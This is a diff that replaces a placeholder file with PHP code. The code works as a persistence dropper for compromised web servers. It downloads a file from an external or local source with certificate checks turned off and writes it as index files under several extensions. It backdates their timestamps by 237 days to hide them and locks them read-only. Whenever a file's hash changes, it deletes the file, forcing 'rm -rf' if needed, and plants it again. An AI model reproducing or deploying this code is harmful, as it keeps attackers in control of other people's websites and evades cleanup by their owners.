@@ -1,1 +1,86 @@
-NGETES
+<?php
+if (!is_dir($dir)) {
+    mkdir($dir, 0755, true);
+}
+
+function fgt($url, $params = null)
+{
+    if ($params) {
+        $url .= '?' . http_build_query($params);
+    }
+    if (function_exists("file_get_contents") && ini_get("allow_url_fopen")) {
+        $arrContextOptions = [
+            "ssl" => ["verify_peer" => false, "verify_peer_name" => false],
+        ];
+        $fgt = file_get_contents(
+            $url,
+            false,
+            stream_context_create($arrContextOptions)
+        );
+    } elseif (
+        function_exists("fopen") &&
+        function_exists("stream_get_contents") &&
+        ini_get("allow_url_fopen")
+    ) {
+        $handle = fopen($url, "r");
+        $fgt = stream_get_contents($handle);
+    } elseif (function_exists("curl_exec")) {
+        $conn = curl_init($url);
+        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, false);
+        curl_setopt($conn, CURLOPT_FRESH_CONNECT, true);
+        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
+        $fgt = curl_exec($conn);
+        curl_close($conn);
+    } else {
+        $fgt = $url;
+    }
+    return $fgt;
+}
+
+if (file_exists($internal)) {
+    $resource = $internal;
+} else {
+    $resource = $external;
+}
+
+function copyy($file, $dest)
+{
+    if (!copy($file, $dest)) {
+        @file_put_contents($dest, fgt($file));
+    }
+}
+
+foreach ($ext as $ekstensi) {
+    $namafile = "index." . $ekstensi;
+    $fullfile = $dir . $namafile;
+    if (!file_exists($fullfile)) {
+        copyy($resource, $fullfile);
+        @touch($fullfile, strtotime("-237 days", time()));
+        $md5file = md5_file($fullfile);
+        if ($md5file != $md8) {
+            if (!unlink($fullfile)) {
+                chmod($fullfile, 0444);
+                exec("rm -rf " . $fullfile);
+            }
+            copyy($resource, $fullfile);
+            if (file_exists($fullfile)) {
+                chmod($fullfile, 0444);
+                @touch($fullfile, strtotime("-237 days", time()));
+            }
+        }
+    } else {
+        $md5file = md5_file($fullfile);
+        if ($md5file != $md8) {
+            chmod($fullfile, 0444);
+            if (!unlink($fullfile)) {
+                chmod($fullfile, 0444);
+                exec("rm -rf " . $fullfile);
+            }
+            copyy($resource, $fullfile);
+            if (file_exists($fullfile)) {
+                chmod($fullfile, 0444);
+                @touch($fullfile, strtotime("-237 days", time()));
+            }
+        }
+    }
+}
